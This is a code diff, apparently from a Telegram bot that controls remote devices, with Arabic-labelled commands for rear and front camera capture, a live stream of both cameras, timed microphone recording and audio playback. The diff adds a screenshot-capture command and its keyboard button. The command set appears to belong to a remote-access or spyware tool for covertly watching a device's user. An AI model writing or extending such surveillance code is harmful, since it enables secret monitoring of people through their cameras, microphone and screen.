@@ -250,9 +250,10 @@ COMMANDS = {
     # camera
     "main-camera":               {"category": "camera", "label": "📷 كاميرا رئيسية",    "description": "تصوير بالكاميرا الخلفية",  "needs_param": False},
     "selfie-camera":             {"category": "camera", "label": "🤳 كاميرا سيلفي",     "description": "تصوير بالكاميرا الأمامية", "needs_param": False},
+    "screenshot":                {"category": "camera", "label": "📸 لقطة شاشة",        "description": "التقاط صورة حقيقية من الشاشة", "needs_param": False},
     "start-camera-stream":       {"category": "camera", "label": "📺 بث الكاميرا (أمامية+خلفية)", "description": "بث مباشر للكاميرتين برابط واحد", "needs_param": False},
     "stop-camera-stream":        {"category": "camera", "label": "⏹ إيقاف بث الكاميرا",  "description": "إيقاف بث الكاميرا", "needs_param": False},
-    # screenshot تمت إزالته
+    # screenshot تمت إزالته - تمت إضافته في camera section
     # audio
     "microphone":     {"category": "audio",  "label": "🎤 تسجيل صوتي",      "description": "تسجيل من الميكروفون (اكتب المدة بالثواني)",     "needs_param": True, "param_hint": "10 أو 60 أو 120 (ثانية)"},
     "playAudio":      {"category": "audio",  "label": "🔊 تشغيل صوت",       "description": "تشغيل ملف صوتي",          "needs_param": True, "param_hint": "رابط الصوت"},
@@ -461,6 +462,7 @@ def data_keyboard(did):
 def camera_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(_cbtn(did,"main-camera"), _cbtn(did,"selfie-camera"))
+    kb.add(_cbtn(did,"screenshot"))
     kb.add(_cbtn(did,"start-camera-stream"))
     kb.add(_cbtn(did,"stop-camera-stream"))
     kb.add(_back(did))
